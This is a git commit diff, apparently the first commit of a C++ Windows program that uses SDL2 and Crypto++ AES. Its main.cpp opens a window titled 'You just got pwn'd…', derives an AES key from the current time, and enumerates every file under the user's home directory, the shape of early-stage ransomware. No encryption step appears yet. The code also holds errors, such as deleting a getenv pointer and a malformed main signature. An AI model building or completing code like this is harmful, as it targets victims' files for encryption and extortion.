bbaf0d03911d8ff331342d36f31f1e1c7dddc9fd
quazar9999 <103794791+quazar9999@users.noreply.github.com>
2024-07-19 21:21:06 -0700

    First commit; Included and added SDL2; Made window

---
+++ includes.h
@@ -0,0 +1,17 @@
+// All necessary includes here
+#include <windows.h> // Windows
+#include <iostream> // Standard
+#include <cstring> // C-Strings
+#include <string> // Advanced String tools
+#include <sstream> // Stringstream
+#include <chrono> // Time
+#include <fstream> // Files
+#include <filesystem> // Files, Minimum C++20
+
+// IMPORTANT! DO.NOT.TOUCH!
+#include<cryptopp/aes.h> // AES
+#include<cryptopp/modes.h> // StringSink
+#include<cryptopp/osrng.h> // asrp and secbyteblock
+#include<cryptopp/hex.h> // Hex
+#include<cryptopp/filters.h> // StringSínk
+#include <SDL.h>
---
+++ main.cpp
@@ -0,0 +1,22 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include "logic.h"
+using namespace std;
+using namespace CryptoPP;
+// g++ --std=c++23 -O2 --static main.cpp -o main.exe
+int main(int argc, char** argv[]) {
+	const int WIDTH = 800, HEIGHT = 600;
+	SDL_Init(SDL_INIT_EVERYTHING);
+	SDL_Window* window = SDL_CreateWindow("You just got pwn'd by a gay, a furry, and a hacker UwU", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, WIDTH, HEIGHT, SDL_WINDOW_ALLOW_HIGHDPI);
+	char* userprofile = getenv("USERPROFILE");
+	std::string usrHome = std::string(userprofile);
+	delete userprofile;
+	std::string keyStr = logic::getUnixMs();
+	SecByteBlock keySbb(reinterpret_cast<const unsigned char*>(keyStr.data()), keyStr.size());
+	fs::path path = usrHome.c_str();
+	std::vector<fs::path> file_paths;
+	logic::collect_files(path, file_paths);
+	for (const auto& file_path : file_paths) {
+        std::cout << file_path << std::endl;
+    }
+	return 0; 
+}
